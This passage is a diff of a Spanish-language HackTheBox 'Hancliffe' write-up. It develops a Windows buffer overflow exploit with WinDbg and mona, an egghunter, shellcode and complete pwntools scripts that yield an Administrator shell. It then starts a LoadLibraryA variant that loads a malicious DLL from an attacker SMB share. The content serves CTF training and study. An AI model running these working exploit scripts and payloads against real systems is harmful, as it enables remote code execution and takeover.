+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 66</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez que el programa corrompe sabemos que solo se escriben <code class="language-plaintext highlighter-rouge">10</code> bytes en el stack pero si buscamos la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> en la memoria podemos encontrar una dirección que parece contener todas las <code class="language-plaintext highlighter-rouge">C's</code>, sin embargo también hay otras 2 direcciones que solo contienen <code class="language-plaintext highlighter-rouge">2</code> de las <code class="language-plaintext highlighter-rouge">C's</code> indicando el espacio de <code class="language-plaintext highlighter-rouge">10</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">g
+(1c50.21b0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00fcfed6 ebx=0000013c ecx=006e3b84 edx=00000000 esi=71901a3d edi=71901a3d  
+eip=42424242 esp=00fcff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+42424242 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> db esp
+00fcff1c  77 30 30 74 77 30 30 74-43 43 ab ab ab ab ab ab  w00tw00tCC......
+00fcff2c  ab ab 00 00 00 00 00 00-00 4b 33 72 34 6a 40 40  .........K3r4j@@
+00fcff3c  6e 4d 34 6a 40 70 41 68-21 54 61 6c 66 69 61 6e  nM4j@pAh!Talfian
+00fcff4c  73 79 61 68 12 00 00 00-90 3b 6e 00 28 3b 6e 00  syah.....;n.(;n.
+00fcff5c  01 00 00 00 1d 00 00 00-3c 01 00 00 e0 36 6e 00  ........<....6n.
+00fcff6c  00 00 00 00 00 00 00 00-84 ff fc 00 a9 7b 8a 77  .............{.w
+00fcff7c  3c 01 00 00 90 7b 8a 77-dc ff fc 00 0b c1 a1 77  <....{.w.......w
+00fcff8c  3c 01 00 00 f6 d5 2d ab-00 00 00 00 00 00 00 00  <.....-.........
+
+</span><span class="ro">0:000></span><span class="p"> s -a 0 L?80000000 w00tw00t
+006e3726  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC
+006e3b6e  77 30 30 74 77 30 30 74-43 43 ab ab ab ab ab ab  w00tw00tCC......
+00fcff1c  77 30 30 74 77 30 30 74-43 43 ab ab ab ab ab ab  w00tw00tCC......</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para evitar falsos positivos enviaremos <code class="language-plaintext highlighter-rouge">4</code> bytes extra antes, de esta forma en el stack se almacenan <code class="language-plaintext highlighter-rouge">4 C's</code> y solo tiene 6 bytes de espacio restante que solo alcanzan para la cadena <code class="language-plaintext highlighter-rouge">w00tw0</code> por lo que no coincidirá con la busqueda de la cadena completa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 66</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 100</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora al ejecutar el exploit el programa corrompe y buscando la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> solo encontramos una coincidencia a diferencia de las 3 que habia antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">g
+(2a34.2fa4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0117fed6 ebx=00000144 ecx=00d73b84 edx=00000000 esi=71901a3d edi=71901a3d  
+eip=42424242 esp=0117ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
+42424242 ??              ???
+
+</span><span class="ro">0:000></span><span class="p"> db esp
+0117ff1c  43 43 43 43 77 30 30 74-77 30 ab ab ab ab ab ab  CCCCw00tw0......
+0117ff2c  ab ab 00 00 00 00 00 00-00 4b 33 72 34 6a 40 40  .........K3r4j@@
+0117ff3c  6e 4d 34 6a 40 70 41 68-21 54 61 6c 66 69 61 6e  nM4j@pAh!Talfian
+0117ff4c  73 79 61 68 12 00 00 00-90 3b d7 00 28 3b d7 00  syah.....;..(;..
+0117ff5c  01 00 00 00 1d 00 00 00-44 01 00 00 e0 36 d7 00  ........D....6..
+0117ff6c  00 00 00 00 00 00 00 00-84 ff 17 01 a9 7b 8a 77  .............{.w
+0117ff7c  44 01 00 00 90 7b 8a 77-dc ff 17 01 0b c1 a1 77  D....{.w.......w
+0117ff8c  44 01 00 00 03 f3 c2 29-00 00 00 00 00 00 00 00  D......)........
+
+</span><span class="ro">0:000></span><span class="p"> s -a 0 L?80000000 w00tw00t
+00d7372a  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta dirección contiene todos los datos que enviamos, las <code class="language-plaintext highlighter-rouge">100 D's</code> se almacenan en la memoria, especificamente parece que en una región del segmento <code class="language-plaintext highlighter-rouge">heap</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> db 0x00d7372a
+00d7372a  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
+00d7373a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00d7374a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00d7375a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00d7376a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00d7377a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
+00d7378a  44 44 44 44 44 44 44 44-44 44 44 44 0a 00 00 00  DDDDDDDDDDDD....
+00d7379a  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+
+</span><span class="ro">0:000></span><span class="p"> !address 0x00d7372a
+
+Mapping file section regions...
+Mapping module regions...
+Mapping PEB regions...
+Mapping TEB and stack regions...
+Mapping heap regions...
+Mapping page heap regions...
+Mapping other regions...
+Mapping stack trace database regions...
+Mapping activation context regions...
+
+Usage:                  Heap
+Base Address:           00d70000
+End Address:            00d75000
+Region Size:            00005000 (  20.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000004          PAGE_READWRITE
+Type:                   00020000          MEM_PRIVATE
+Allocation Base:        00d70000
+Allocation Protect:     00000004          PAGE_READWRITE
+More info:              heap owning the address: !heap -s -h 0xd70000
+More info:              heap segment
+More info:              heap entry containing the address: !heap -x 0xd7372a  
+
+Content source: 1 (target), length: 18d6</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente para evitar problemas o solaparnos con el stack en el poco espacio que nos queda haremos que este un poco mas arriba restandole <code class="language-plaintext highlighter-rouge">0x64</code> bytes</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">subesp </span><span class="o">= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ahora con mona creamos el <code class="language-plaintext highlighter-rouge">egghunter</code>, algo a tener en cuenta es que aunque el binario es <code class="language-plaintext highlighter-rouge">x86</code> la maquina victima es <code class="language-plaintext highlighter-rouge">x64</code> asi que tenemos que incluir un <code class="language-plaintext highlighter-rouge">-wow64</code></p>
-<a href="/hackthebox/hancliffe/27.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/27.png"></p></div></a>
 
-<p class="plain-text">El <code class="language-plaintext highlighter-rouge">egghunter</code> lo que hara sera buscar en toda la memoria la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutar todo lo que esta despues que en este caso sera nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona egghunter -wow64
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py egghunter -wow64
+[+] Egg set to w00t
+[+] Generating egghunter for wow64, Windows 10
+[+] Preparing output file 'egghunter.txt'
+    - (Re)setting logfile C:\mona\egghunter.txt
+[+] Egghunter  (51 bytes): 
+"\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"  
+"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05"  
+"\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">egghunter</code> lo que hara sera buscar en toda la memoria la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutar todo lo que esta despues que en este caso sera nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, el funcionamiento de este egghunter ya fue analizado en otro <a href="/exploitdevelopment/windows-user/egghunters#wow64">post</a> sobre explotación</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
@@ -1185,13 +1364,73 @@ C:\Windows\system32></span>
 </span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para el payload final enviaremos el <code class="language-plaintext highlighter-rouge">egghunter</code>, la basura y saltaremos a <code class="language-plaintext highlighter-rouge">EAX</code> donde esta el egghunter, dejamos <code class="language-plaintext highlighter-rouge">4</code> bytes de espacio y despues enviamos el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> para que este se guarde en algun lugar de toda la memoria</p>
+<p class="plain-text">Para el payload final enviaremos el <code class="language-plaintext highlighter-rouge">egghunter</code>, la basura y saltaremos a <code class="language-plaintext highlighter-rouge">eax</code> donde esta el egghunter, dejamos <code class="language-plaintext highlighter-rouge">4</code> bytes de espacio y despues enviamos el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> para que este se guarde en algun lugar de toda la memoria</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">subesp </span><span class="o">+ </span><span class="p">egghunter </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax
 payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode</span>
 </code></pre></div></div><br>
+
+<p class="plain-text">Para verificar que funciona usaremos el shellcode para una calculadora antes creado y ejecutamos el exploit, como resultado abrimos una calculadora en el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+subesp</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
+
+egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
+</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
+</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
+</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  
+</span><span class="p">
+offset </span><span class="o">=</span><span class="mi"> 66</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(egghunter</span><span class="o"> +</span><span class="p"> subesp))
+
+jmpeax</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x719023b3</span><span class="p">)
+
+egg</span><span class="o"> =</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
+
+shellcode</span><span class="o"> = </span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb</span><span class="s">"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">subesp </span><span class="o">+</span><span class="p"> egghunter</span><span class="o"> +</span><span class="p"> junk</span><span class="o"> +</span><span class="p"> jmpeax
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="mi"> 4</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">egg</span><span class="o"> +</span><span class="p"> shellcode
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
+</code></pre></div></div><br>
+
+<a href="/hackthebox/hancliffe/29.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/29.png"></p></div></a>
 
 <p class="plain-text">Este script tambien constara de 2 etapas, cuando el <code class="language-plaintext highlighter-rouge">egg</code> y el shellcode esten en algun lugar de la memoria ejecutara el <code class="language-plaintext highlighter-rouge">egghunter</code> que nos buscara el egg que es la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutara todo lo que esta despues osea el <code class="language-plaintext highlighter-rouge">shellcode</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1251,7 +1490,7 @@ payload </span><span class="o">+= </span><span class="p">subesp </span><span cla
 payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"hancliffe.htb"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
@@ -1262,8 +1501,8 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your 
 <p class="plain-text">Enviamos el exploit a la maquina que corre el servicio en el puerto <code class="language-plaintext highlighter-rouge">9999</code> y recibimos una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la ultima flag de root</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to hancliffe.htb on port 9999: Done
-[</span><span class="az">*</span><span class="p">] Closed connection to hancliffe.htb port 9999</span>
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.11.115 on port 9999: Done
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.11.115 port 9999</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -1273,10 +1512,253 @@ Connection received on 10.10.11.115
 Microsoft Windows [Version 10.0.19043.1266]
 (c) Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
 hancliffe\administrator
 
-C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+7cc**************************564
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="bof-loadlibrary">
+<br><h3 class="post-title">Buffer Overflow - LoadLibraryA</h3><br>
+
+<p class="plain-text">La siguiente forma de explotarlo involucra la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, esta permite cargar librerias por lo que podriamos simplemente cargar un archivo <code class="language-plaintext highlighter-rouge">.dll</code> malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona getiat -m myfirstapp.exe -s loadlibrary
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\windbg\x86\mona.py getiat -m myfirstapp.exe -s loadlibrary
+
+---------- Mona command started on 2024-07-24 21:21:57 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules myfirstapp.exe
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Querying 1 modules
+[+] Preparing output file 'iatsearch.txt'
+    - (Re)setting logfile C:\mona\iatsearch.txt
+    Getting IAT for MyFirstApp.exe.
+    Enumerating IAT
+0x719081c8 | At 0x719081c8 in myfirstapp (base + 0x000081c8) : 0x778c0ed0 (ptr to KERNEL32.loadlibrarya)  - [KERNEL32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.3672, 0x4140  
+
+1 entries found</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> es bastante simple, solo recibe como <code class="language-plaintext highlighter-rouge">parametro</code> el nombre de la libreria, por lo que si la controlamos podemos cargar un <code class="language-plaintext highlighter-rouge">.dll</code> malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">HMODULE </span><span class="na">LoadLibraryA</span><span class="p">(
+  [</span><span class="mi">in</span><span class="p">] </span><span class="no">LPCSTR </span><span class="p">lpLibFileName
+);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como no tenemos suficiente espacio en el stack para toda la string la empujaremos con <code class="language-plaintext highlighter-rouge">push</code>, iniciamos definiendo la string, dandole la vuelta y pasandola a hexadecimal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">smb</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">192.168.233.129</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para evitar solaparnos cuando empujemos datos al stack restaremos al puntero <code class="language-plaintext highlighter-rouge">esp</code> <code class="language-plaintext highlighter-rouge">0x64</code> bytes, luego con un <code class="language-plaintext highlighter-rouge">xor</code> hacemos que <code class="language-plaintext highlighter-rouge">ebx</code> valga <code class="language-plaintext highlighter-rouge">0</code> y lo empujamos al stack, esto ya que un null byte o <code class="language-plaintext highlighter-rouge">0x00</code> servirá para indicar que ahi termina la string</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">dll  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)  
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con un null terminator al final podemos empujar toda la string con la ruta smb al <code class="language-plaintext highlighter-rouge">.dll</code> malicioso al stack mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> de <code class="language-plaintext highlighter-rouge">4</code> en <code class="language-plaintext highlighter-rouge">4</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0</span><span class="p">, </span><span class="no">len</span><span class="p">(smb), </span><span class="mi">8</span><span class="p">):
+     dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> smb[i:</span><span class="mi">8</span><span class="o">+</span><span class="p">i])</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al finalizar el bucle la string deberia estar en <code class="language-plaintext highlighter-rouge">esp</code>, sin embargo necesitamos un puntero a <code class="language-plaintext highlighter-rouge">esp</code> por lo que con <code class="language-plaintext highlighter-rouge">push</code> empujamos el puntero al stack, para finalizar simplemente llamamos al desreferenciado de la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> para cargarla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esp"</span><span class="p">)
+dll</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719081c8]"</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit es bastante simple, empuja de <code class="language-plaintext highlighter-rouge">4</code> bytes en <code class="language-plaintext highlighter-rouge">4</code> bytes que es el tamaño de un <code class="language-plaintext highlighter-rouge">dword</code> toda la string y toma el puntero a esa ruta para llamar a <code class="language-plaintext highlighter-rouge">LoadLibraryA</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
